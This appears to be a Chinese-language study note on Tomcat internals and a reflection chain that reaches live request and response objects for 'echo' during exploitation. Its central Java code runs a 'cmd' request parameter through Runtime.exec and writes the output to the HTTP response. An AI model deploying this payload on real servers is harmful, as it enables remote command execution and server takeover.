# tomcat回显问题

	

tomcat 寻找通用回显

### 机构图基础知识

**Server**:整个tomcat启动的时候只有一个server

**Service**:一个server中包含了多个service,表示服务

**Container**:容器,可以看作是一个servlet容器,包含一些Engine,Host,Context,Wraper等,访问的路径什么的就存放在这里

* Engine -- 引擎
* Host -- 主机
* Context -- 上下文(也就是应用程序)
* Wrapper -- 包装器  
  **Connector**:连接器,将service和container连接起来,作用就是把来自客户端的请求转发到container容器

**Connector**内部的组件:

* Endpoint-用于网络监听
* Processor-用于协议解析处理
* Adapter-用于转换，解耦connector和container

假设来自客户的请求为：http://localhost:8080/test/index.jsp 请求被发送到本机端口8080，被在那里侦听的Connector组件捕获:

* Connector把该请求交给它所在的Service的Engine来处理，并等待Engine的回应
* Engine获得请求localhost:8080/test/index.jsp，匹配它所有虚拟主机Host
* Engine匹配到名为localhost的Host(即使匹配不到也把请求交给该Host处理，因为该Host被定义为该Engine的默认主机)
* localhost Host获得请求/test/index.jsp，匹配它所拥有的所有Context
* Host匹配到路径为/test的Context(如果匹配不到就把该请求交给路径名为""的Context去处理)
* path\="/test"的Context获得请求/index.jsp，在它的mapping table中寻找对应的servlet
* Context匹配到URL PATTERN为\*.jsp的servlet，对应于JspServlet类，构造HttpServletRequest对象和HttpServletResponse对象，作为参数调用JspServlet的doGet或doPost方法
* Context把执行完了之后的HttpServletResponse对象返回给Host
* Host把HttpServletResponse对象返回给Engine
* Engine把HttpServletResponse对象返回给Connector
* Connector把HttpServletResponse对象返回给客户browser

## 回显方法

本质是寻找Http11Processor类    回显的本质都是找到处理继承了http请求的类  将回显写入到里边

例如 AbstractProcessor类是tomcat中用来处理http请求逻辑的类

这里共有两个request类 分别为 `org.apache.catalina.connector.Request`​ 和`org.apache.coyote.Request`​

‍

只要获取到了Http11Processor或者AbstractProcessor即可以获取org.apache.catalina.connector.Request

AbstractProtocol\$ConnectionHandler类中存在Http11Processor

RequestInfo rp \= processor.getRequest().getRequestProcessor()作用是org.apache.coyote.Request对象

rp.setGlobalProcessor(this.global);-----》RequestGroupInfo.addRequestProcessor---->CoyoteAdapter中的connector存在protocolHandler字段

ProtocolHandler是一个接口

AbstractProtocol也实现了ProtocolHandler接口

‍

‍

总体调用链如下

connector----》AbstractProtocol\$ConnectoinHandler-----》RequestGroupInfo(global)—————》RequestInfo---->Request--->Response--->`org.apache.catalina.core.StandardService.addConnector`​

‍

‍

## 环境搭建

```JAVA
org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        org.apache.catalina.core.StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

        try {
            Field context = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
            context.setAccessible(true);
            ApplicationContext ApplicationContext = (ApplicationContext)context.get(standardContext);
            
            Field service = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
            service.setAccessible(true);
            org.apache.catalina.core.StandardService standardService = (StandardService) service.get(ApplicationContext);
            
            Field connectors = standardService.getClass().getDeclaredField("connectors");
            connectors.setAccessible(true);
            Connector[] connector = (Connector[]) connectors.get(standardService);
            
            Field protocolHandler = Class.forName("org.apache.catalina.connector.Connector").getDeclaredField("protocolHandler");
            protocolHandler.setAccessible(true);
            
            Class<?>[] declaredClasses = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredClasses();
            
            for (Class<?> declaredClass : declaredClasses) {

                if (declaredClass.getName().length()==52){
                    
                    java.lang.reflect.Method getHandler = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler",null);
                    getHandler.setAccessible(true);
                    
                    Field global = declaredClass.getDeclaredField("global");
                    global.setAccessible(true);
                    org.apache.coyote.RequestGroupInfo requestGroupInfo = (RequestGroupInfo) global.get(getHandler.invoke(connector[0].getProtocolHandler(), null));

                    Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                    processors.setAccessible(true);
                    java.util.List<org.apache.coyote.RequestInfo>  requestInfo = (List<RequestInfo>) processors.get(requestGroupInfo);
                    Field req1 = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
                    req1.setAccessible(true);

                    for (RequestInfo info : requestInfo) {

                        org.apache.coyote.Request request = (Request) req1.get(info);

                        org.apache.catalina.connector.Request request1 = (org.apache.catalina.connector.Request) request.getNote(1);
                        
                        org.apache.catalina.connector.Response response = request1.getResponse();

                        String cmd = request1.getParameter("cmd");
                        InputStream is = Runtime.getRuntime().exec(cmd).getInputStream();
                        BufferedInputStream bis = new BufferedInputStream(is);
                        int len;
                        while ((len = bis.read())!=-1){
                            response.getWriter().write(len);
                        }
                    }
                }
            }

        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (IllegalAccessException | ClassNotFoundException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        }
```

‍

‍

问题

‍

tomcat一直报500错误

在我的代码中getresource代码如下

```JAVA
public WebResourceRoot getResource(){
return null
}
```

流程代码应该返回resource

‍

搜了以下不同tomcat版本不同

```public
public WebResourceRoot getResource(){
return this.resource

}
```

这样才行

‍

### 总结

发现在java-chains 和ysel中已经有写好的相关内容 可以直接调用来利用tomcat回显写在响应头中

 本次主要是调试链子和理解原理  耗时主要在搭建环境出错的问题上

在thundermail环境中 可以直接利用相关yse 输出到tomcat回显
